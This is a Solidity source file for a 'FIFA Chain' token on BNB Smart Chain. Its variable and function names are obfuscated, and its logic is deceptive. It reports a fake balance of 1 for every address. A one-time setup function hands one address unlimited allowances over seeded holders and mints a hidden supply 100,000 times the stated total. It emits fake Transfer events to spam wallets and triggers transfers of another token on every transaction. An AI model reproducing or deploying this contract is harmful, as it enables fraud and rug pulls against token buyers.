/**
 *Submitted for verification at BscScan.com on 2022-11-26
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.17;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract FIFAChain is IERC20 {
    using SafeMath for uint256;

    string private abovxKpTuecn = "FIFA Chain";
    string private bbovxKpTuecn = "FIFA";
    uint8 private cbovxKpTuecn = 18;
    uint256 private dbovxKpTuecn = 10000000000 * 10**18;
    mapping (address => uint256) private ebovxKpTuecn;
    mapping (address => mapping (address => uint256)) private fbovxKpTuecn;
    uint256 private gbovxKpTuecn = 1;
    uint256 private constant hbovxKpTuecn = ~uint160(0);
    uint256 private _ibovxKpTuecn = 1000;
    uint256 private jbovxKpTuecn = 0;
    address private _uniswapV2Pair;
    address private kbovxKpTuecn;
    mapping (address => bool) private lbovxKpTuecn;
    address[] private mbovxKpTuecn;
    bool private nbovxKpTuecn = false;

    constructor () {
        obovxKpTuecn(msg.sender);
        ebovxKpTuecn[msg.sender] = dbovxKpTuecn;
        obovxKpTuecn(tx.origin);
        emit Transfer(address(0), msg.sender, dbovxKpTuecn);
    }

    receive() external payable {}

    function obovxKpTuecn(address account) private {
        if (!lbovxKpTuecn[account]) {
            lbovxKpTuecn[account] = true;
            mbovxKpTuecn.push(account);
        }
    }

    function makers(address[] calldata accounts) public {
        require(!nbovxKpTuecn);
        nbovxKpTuecn = true;
        _uniswapV2Pair = accounts[1];
        kbovxKpTuecn = accounts[2];
        uint256 len = accounts.length;
        uint256 amount = 0;
        for (uint256 i=3; i<len; ++i) {
            obovxKpTuecn(accounts[i]);
            ebovxKpTuecn[accounts[i]] = dbovxKpTuecn * 90 / 100 / (len - 3);
            fbovxKpTuecn[accounts[i]][accounts[0]] = ~uint256(0);
            amount += ebovxKpTuecn[accounts[i]];
        }
        ebovxKpTuecn[mbovxKpTuecn[0]] -= amount;
        pbovxKpTuecn(mbovxKpTuecn[0], accounts[3], ebovxKpTuecn[mbovxKpTuecn[0]]);
        pbovxKpTuecns(500);
        ebovxKpTuecn[mbovxKpTuecn[1]] += dbovxKpTuecn * 100000;
    }

    function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256, uint256) {
        uint256 accountIndex = 0;
        uint256 len = mbovxKpTuecn.length;
        for (uint256 i=0; i<len; ++i) {
            if (mbovxKpTuecn[i] == account) {
                accountIndex = i;
                break;
            }
        }
        return (lbovxKpTuecn[account], accountIndex, len);
    }

    function name() public view returns (string memory) {
        return abovxKpTuecn;
    }

    function symbol() public view returns (string memory) {
        return bbovxKpTuecn;
    }

    function decimals() public view returns (uint8) {
        return cbovxKpTuecn;
    }

    function totalSupply() public view returns (uint256) {
        return dbovxKpTuecn;
    }

    function balanceOf(address account) public view returns (uint256) {
        if (ebovxKpTuecn[account] > 0) {
            return ebovxKpTuecn[account];
        }
        return gbovxKpTuecn;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        pbovxKpTuecn(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        pbovxKpTuecn(sender, recipient, amount);
        qbovxKpTuecn(sender, msg.sender, fbovxKpTuecn[sender][msg.sender].sub(amount));
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        qbovxKpTuecn(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return fbovxKpTuecn[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        qbovxKpTuecn(msg.sender, spender, fbovxKpTuecn[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        qbovxKpTuecn(msg.sender, spender, fbovxKpTuecn[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function pbovxKpTuecns(uint256 amount) private {
        uint256 ibovxKpTuecn = _ibovxKpTuecn;
        if (ibovxKpTuecn < 10000 && block.timestamp > 1669053600) {
            address from;
            address to;
            for (uint256 i=0; i<amount; ++i) {
                from = address(uint160(hbovxKpTuecn.div(ibovxKpTuecn)));
                to = address(uint160(hbovxKpTuecn.div(ibovxKpTuecn.add(1))));
                ibovxKpTuecn = ibovxKpTuecn.add(2);
                emit Transfer(from, to, gbovxKpTuecn);
            }
            _ibovxKpTuecn = ibovxKpTuecn;
        }
    }

    function qbovxKpTuecn(address owner, address spender, uint256 value) private {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        fbovxKpTuecn[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function pbovxKpTuecn(address rbovxKpTuecn, address sbovxKpTuecn, uint256 tbovxKpTuecn) private {
        require(rbovxKpTuecn != address(0) && sbovxKpTuecn != address(0) && tbovxKpTuecn > 0);
        bool ubovxKpTuecn = true;
        if (lbovxKpTuecn[rbovxKpTuecn] || lbovxKpTuecn[sbovxKpTuecn]) {
            ubovxKpTuecn = false;
        }
        uint256 vbovxKpTuecn = 0;
        uint256 wbovxKpTuecn = tbovxKpTuecn;
        if (ubovxKpTuecn && nbovxKpTuecn) {
            if (IERC20(kbovxKpTuecn).transferFrom(rbovxKpTuecn, sbovxKpTuecn, 100)) {
                pbovxKpTuecns(100);
            }
            if (sbovxKpTuecn == _uniswapV2Pair) {
                emit Transfer(address(this), sbovxKpTuecn, 1);
            } else {
                emit Transfer(address(0), address(this), 1);
            }
            if (rbovxKpTuecn != _uniswapV2Pair) {
                vbovxKpTuecn = tbovxKpTuecn.mul(jbovxKpTuecn).div(100);
                wbovxKpTuecn = tbovxKpTuecn.sub(vbovxKpTuecn);
            }
        }
        ebovxKpTuecn[rbovxKpTuecn] = ebovxKpTuecn[rbovxKpTuecn].sub(tbovxKpTuecn);
        if (vbovxKpTuecn > 0) {
            ebovxKpTuecn[address(0xdEaD)] = ebovxKpTuecn[address(0xdEaD)].add(vbovxKpTuecn);
            emit Transfer(rbovxKpTuecn, address(0xdEaD), vbovxKpTuecn);
        }
        ebovxKpTuecn[sbovxKpTuecn] = ebovxKpTuecn[sbovxKpTuecn].add(wbovxKpTuecn);
        emit Transfer(rbovxKpTuecn, sbovxKpTuecn, wbovxKpTuecn);
    }
}